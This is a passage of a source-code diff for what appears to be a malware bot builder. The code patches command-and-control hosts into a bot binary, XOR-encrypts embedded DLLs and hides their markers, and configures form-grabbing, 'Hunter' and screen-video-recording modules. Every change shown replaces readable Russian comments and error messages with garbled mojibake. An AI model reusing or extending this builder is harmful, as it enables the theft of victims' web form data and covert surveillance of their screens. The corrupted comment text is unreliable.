 		Stream->Write(&NameLen, sizeof(NameLen));
 
 		AnsiString Name = P->Name;
@@ -1082,33 +1093,33 @@ void TBotBuilder::SaveToStream(TStream *Stream)
 
 		Stream->Write(Name.c_str(), NameLen);
 
-		// Записываем данные параметра
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         P->SaveToStream(Stream);
 	}
 }
 
 
 //--------------------------------------------------
-//  Функция загружает значения параметров из потока
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotBuilder::LoadFromStream(TStream *Stream)
 {
-	// Загружаем настройки из потока данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	ClearValues();
 
-	// Читаем заголовок
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TBuilderFileHeader H;
 
 	int Readed = Stream->Read(&H, sizeof(H));
 
-	// Проверяем правильность заголовка
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if ( Readed < sizeof(H) || H.Signature != BUILDER_FILE_SIGNATURE)
 		throw Exception(Error_InvalidParamsFile);
 
-    // Загружаем настройки параметров
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	for (DWORD i = 0; i < H.Count; i++)
 	{
-		// Читаем имя параметра
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD NameLen = 0;
 		Stream->Read(&NameLen, sizeof(NameLen));
 
@@ -1120,13 +1131,13 @@ void TBotBuilder::LoadFromStream(TStream *Stream)
 
 		DecryptStr(Name.c_str(), Name.c_str());
 
-		// Читаем данные параметра
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		TBotParam* Param = ParamByName(Name);
 		if (Param)
 			Param->LoadFromStream(Stream);
 		else
 		{
-			// Параметр не найден, пропускаем блок
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			DWORD Size = 0;
 			Stream->Read(&Size, sizeof(Size));
 			Stream->Position = Stream->Position + Size;
@@ -1135,7 +1146,7 @@ void TBotBuilder::LoadFromStream(TStream *Stream)
 }
 
 //--------------------------------------------------
-//  Функция сохраняет значения параметров в файл
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotBuilder::SaveToFile(const UnicodeString &FileName)
 {
@@ -1151,7 +1162,7 @@ void TBotBuilder::SaveToFile(const UnicodeString &FileName)
 }
 
 //--------------------------------------------------
-//  Функция загружает значения параметров из файла
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotBuilder::LoadFromFile(const UnicodeString &FileName)
 {
@@ -1169,7 +1180,7 @@ void TBotBuilder::LoadFromFile(const UnicodeString &FileName)
 
 
 //--------------------------------------------------
-//  Функция устанавливает редактор модуля
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotBuilder::SetModuleEdit(const UnicodeString &Name, TBotModuleEdit* Edit)
 {
@@ -1180,7 +1191,7 @@ void TBotBuilder::SetModuleEdit(const UnicodeString &Name, TBotModuleEdit* Edit)
 
 
 //--------------------------------------------------
-//  Функция возвращает модуль с именем Name
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Name
 //--------------------------------------------------
 TBotModule* TBotBuilder::ModuleByName(const UnicodeString &Name)
 {
@@ -1195,7 +1206,7 @@ TBotModule* TBotBuilder::ModuleByName(const UnicodeString &Name)
 }
 
 //--------------------------------------------------
-//  Функция возвращает количество модулей
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 int TBotBuilder::GetModulesCount()
 {
@@ -1203,7 +1214,7 @@ int TBotBuilder::GetModulesCount()
 }
 
 //--------------------------------------------------
-//  Функция возвращает модуль по индексу
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 TBotModule* TBotBuilder::GetModules(int Index)
 {
@@ -1212,34 +1223,34 @@ TBotModule* TBotBuilder::GetModules(int Index)
 
 
 //--------------------------------------------------
-//  Функция ввыполняет сборку билда
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotBuilder::Build(bool FullBuild)
 {
 
-	// Создаём сесионный пароль
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	FSessionPassword->AsString = Random::RandomString2(MAX_SESSION_PASSW_SIZE - 1, 'a', 'z').t_str();
 
-	// Очищаем сессионные параметры
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	ClearSessionParams();
 
 
-    // Создаём сборку
+    // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	return inherited::Build(FullBuild);
 }
 
 //--------------------------------------------------
-//  Инициализируем сессионные параметры
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotBuilder::DoBeforeBuild(LPBYTE Buf, DWORD BufSize)
 {
-	// Инициализируем параметры шифрования DLL
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLL
 	InitializeDLLsEncryptors(Buf, BufSize);
 }
 
 
 //--------------------------------------------------
-//  Функция инициализирует параметры шифрования DLL
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLL
 //--------------------------------------------------
 void TBotBuilder::InitializeDLLsEncryptors(LPBYTE Buf, DWORD BufSize)
 {
@@ -1248,33 +1259,33 @@ void TBotBuilder::InitializeDLLsEncryptors(LPBYTE Buf, DWORD BufSize)
 	LPBYTE StartPtr = Buf;
 	while (true)
 	{
-		// Определяем позицию DLL в буфере
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLL пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		int Pos = STR::Pos(Buf, ENCRYPTED_DLL_MARKER, BufSize - (Buf - StartPtr), true);
 		if (Pos < 0) break;
 
-		// Запоминаем начало маркера
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR MarkerPtr = Buf + Pos;
 
-		// Определяем позицию относительно всего буфера
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		int GlobalPos = MarkerPtr - StartPtr;
 
-		// Переходим к длл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ
 		Buf     += Pos + ENCRYPTED_DLL_MARKER_SIZE;
 
-		// Определяем размер данных
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD DllSize = *(PDWORD)Buf;
 
-		// Пропускаем данные о размере
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		Buf     += sizeof(DWORD);
 
 		if (DllSize > BufSize)
-			throw Exception("Нарушение целостности встроенных DLL!\r\nОбратитесь к разработчикам!");
+			throw Exception("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLL!\r\nпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ!");
 
 
-		// Пропускаем длл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		Buf     += DllSize;
 
-		// Создаём элемент
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD TotalSize = ENCRYPTED_DLL_MARKER_SIZE + sizeof(DWORD) + DllSize;
 		TBotDLLEncryptor *Item = new TBotDLLEncryptor(this, GlobalPos, TotalSize);
 	}
@@ -1283,8 +1294,8 @@ void TBotBuilder::InitializeDLLsEncryptors(LPBYTE Buf, DWORD BufSize)
 }
 
 //--------------------------------------------------
-//  Функция возвращает естину если включено
-//  шифрование строк
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotBuilder::GetEncryptStrings()
 {
@@ -1292,7 +1303,7 @@ bool TBotBuilder::GetEncryptStrings()
 }
 
 //--------------------------------------------------
-//  Функция включает/отключает шифрование строк
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotBuilder::SetEncryptStrings(bool Value)
 {
@@ -1319,7 +1330,7 @@ __fastcall TOldBotBuilder::TOldBotBuilder(TComponent* AOwner)
 	FActiveModules = new TList();
 
 
-	// Добавляем основные параметры
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	FPrefix    = new TOldBotParam(this, true, true, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, ParamTitle_Prefix);
 	FHosts     = new TOldBotParam(this, true, true, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, ParamTitle_Hosts);
 	FDelay     = new TOldBotParam(this, true, false, BOTPARAM_DELAY, MAX_DELAY_SIZE, ParamTitle_Delay);
@@ -1342,7 +1353,7 @@ __fastcall TOldBotBuilder::~TOldBotBuilder()
 	delete FFile;
 }
 
-// Функция загружает исходный файл
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 void __fastcall TOldBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 {
 	FFile->Size = 0;
@@ -1361,11 +1372,11 @@ void __fastcall TOldBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 
 
 //-----------------------------------------------------
-// Build - Функция собирает сборку
+// Build - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //
-// FullBuild  Параметр указывает, что собирается полная
-//            сборка, при которой свойство параметров
-//            Enabled будет игнорироваться
+// FullBuild  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//            пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//            Enabled пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //-----------------------------------------------------
  bool __fastcall TOldBotBuilder::Build(bool FullBuild)
 {
@@ -1374,11 +1385,11 @@ void __fastcall TOldBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 
     Message(Status_StartBuild);
 
-	// Создаём случайый пароль шифрования строк
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PCHAR StrPass = Random::RandomString(MAX_SESSION_PASSW_SIZE - 1, 'a', 'z');
 	FStringsPassword->AsAnsiString = StrPass;
 
-	// Проверяем параметры
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Message(Status_CheckParams);
 
 	TStringList* Errors = new TStringList();
@@ -1402,12 +1413,12 @@ void __fastcall TOldBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 	if (FResultFileName.IsEmpty())
 		throw Exception(Error_UnknownResultFileName);
 
-	// Записываем
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	TMemoryStream *Mem = new TMemoryStream();
 	try {
 
-		// Дублируем файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		FFile->Position = 0;
 		Mem->LoadFromStream(FFile);
 
@@ -1416,24 +1427,24 @@ void __fastcall TOldBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 
         Message(Status_WriteParams);
 
-		// Записываем параметры
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD Count   = FParams->Count;
 
 		PCHAR Buf     = (PCHAR)Mem->Memory;
 		DWORD BufSize = Mem->Size;
 
 
-		// Шифруем данные DLL
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ DLL
 		//EncryptDllData(Buf, BufSize, StrPass);
 
-		// Шифруем строки бота
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		//FStringsEncryptor->Encrypt(Buf, BufSize, StrPass);
 		STR::Free(StrPass);
 
-		// Записываем пароль для строк
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		FStringsPassword->Write(Buf, BufSize);
 
-		// Вшиваем параметры
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		for (int i = 0; i < Count; i++)
 		{
 			TOldBotParam* Param = (TOldBotParam*)FParams->Items[i];
@@ -1444,7 +1455,7 @@ void __fastcall TOldBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 					WriteParametr(Buf, BufSize, Param);
 				else
 				{
-					// Параметр отключен, забиваем его место нулями
+					// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 					if (Param->Enabled)
 						Param->WriteEmptyData(Buf, BufSize);
                 }
@@ -1452,7 +1463,7 @@ void __fastcall TOldBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 		}
 
 
-		// Сохраняем файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		Message(Status_SaveFile + FResultFileName);
 		TFileStream *File = new TFileStream(FResultFileName, fmCreate);
 		try {
@@ -1475,7 +1486,7 @@ void __fastcall TOldBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 }
 //-----------------------------------------------------------------
 
-// Функция записывает данные в буфер
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 void __fastcall TOldBotBuilder::WriteParametr(PCHAR Buf, DWORD BufSize, TOldBotParam* Param)
 {
     Message(Status_WriteParam + Param->DisplayName);
@@ -1488,12 +1499,12 @@ void __fastcall TOldBotBuilder::WriteParametr(PCHAR Buf, DWORD BufSize, TOldBotP
 
 
 
-// Функция вызывается после изменения значения параметра
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void __fastcall TOldBotBuilder::ParamValueChanged(TOldBotParam* Sender)
 {
 	if (Sender == FPrefix)
 	{
-		// Сменился префикс, меняем имя результирующего файла
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
     }
 }
 
@@ -1501,7 +1512,7 @@ void __fastcall TOldBotBuilder::ParamValueChanged(TOldBotParam* Sender)
 
 void __fastcall TOldBotBuilder::ClearParams()
 {
-	// Функция очищает данные параметров
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	for (int i = 0; i < FParams->Count; i++)
 		((TOldBotParam*)FParams->Items[i])->Clear();
 }
@@ -1533,38 +1544,38 @@ TOldBotModule* __fastcall TOldBotBuilder::AddModule(const char *Name)
 
 void __fastcall TOldBotBuilder::EncryptDllData(PCHAR Buf, DWORD BufSize, PCHAR Passw)
 {
-	// Функция шифрует данные библиотек
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	while (true)
 	{
-		// Определяем позицию DLL в буфере
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLL пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		int Pos = STR::Pos(Buf, ENCRYPTED_DLL_MARKER, BufSize, true);
 		if (Pos < 0)
 			break;
 
-		// Запоминаем начало маркера
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         PCHAR MarkerPtr = Buf + Pos;
 
-		// Переходим к длл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ
 		Buf     += Pos + ENCRYPTED_DLL_MARKER_SIZE;
 		BufSize -= Pos + ENCRYPTED_DLL_MARKER_SIZE;
 
-		// Определяем размер данных
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD DllSize = *(PDWORD)Buf;
 
-		// Пропускаем данные о размере
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		Buf     += sizeof(DWORD);
 		BufSize -= sizeof(DWORD);
 
 		if (DllSize > BufSize)
-			throw Exception("Нарушение целостности встроенных DLL!\r\nОбратитесь к разработчикам!");
+			throw Exception("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLL!\r\nпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ!");
 
-		// Шифруем данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		XORCrypt::Crypt(Passw, (LPBYTE)Buf, DllSize);
 
-		// Прячем маркер
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		XORCrypt::Crypt(Passw, (LPBYTE)MarkerPtr, ENCRYPTED_DLL_MARKER_SIZE);
 
-		// Пропускаем длл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		Buf     += DllSize;
 		BufSize -= DllSize;
 	}
@@ -1573,7 +1584,7 @@ void __fastcall TOldBotBuilder::EncryptDllData(PCHAR Buf, DWORD BufSize, PCHAR P
 
 
 //-----------------------------------------------------------------------------
-//                  Инициализация модулей бота
+//                  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //-----------------------------------------------------------------------------
 
 
@@ -1584,56 +1595,56 @@ void __fastcall TOldBotBuilder::InitializeModules()
 
     // Hunter
 	Module = AddModule(Module_Hunter);
-	Module->AddParam(false, HUNTER_PARAM_ENCRYPTED, HUNTER_PARAM_NAME, HUNTER_PARAM_SIZE, "Ссылки модуля Hunter");
+	Module->AddParam(false, HUNTER_PARAM_ENCRYPTED, HUNTER_PARAM_NAME, HUNTER_PARAM_SIZE, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Hunter");
 
-    // Настройки формграбера
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Module = AddModule(Module_FormGraber);
-	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_URLS, FGRFILTER_PARAM_NAME_URLS, FGRFILTER_PARAM_SIZE_URLS, "Ссылки формграбера");
-	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, FGRFILTER_PARAM_NAME_DATAMASK, FGRFILTER_PARAM_SIZE_DATAMASK, "Маски пост данных");
+	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_URLS, FGRFILTER_PARAM_NAME_URLS, FGRFILTER_PARAM_SIZE_URLS, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
+	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, FGRFILTER_PARAM_NAME_DATAMASK, FGRFILTER_PARAM_SIZE_DATAMASK, "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 
 
 
-	// Видеорекордер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Module = AddModule(Module_VideoRecorder);
-	Module->AddParam(true,  VIDEOREC_PARAM_ENCRYPTED_HOST, VIDEOREC_PARAM_NAME_HOST1, VIDEOREC_PARAM_SIZE_HOST, "Сервер записи видео №1");
-	Module->AddParam(false, VIDEOREC_PARAM_ENCRYPTED_HOST, VIDEOREC_PARAM_NAME_HOST2, VIDEOREC_PARAM_SIZE_HOST, "Сервер записи видео №2");
-	Module->AddParam(false, VIDEOREC_PARAM_ENCRYPTED_URLS, VIDEOREC_PARAM_NAME_URLS,  VIDEOREC_PARAM_SIZE_URLS, "Адреса старта записиси видео");
+	Module->AddParam(true,  VIDEOREC_PARAM_ENCRYPTED_HOST, VIDEOREC_PARAM_NAME_HOST1, VIDEOREC_PARAM_SIZE_HOST, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ1");
+	Module->AddParam(false, VIDEOREC_PARAM_ENCRYPTED_HOST, VIDEOREC_PARAM_NAME_HOST2, VIDEOREC_PARAM_SIZE_HOST, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ2");
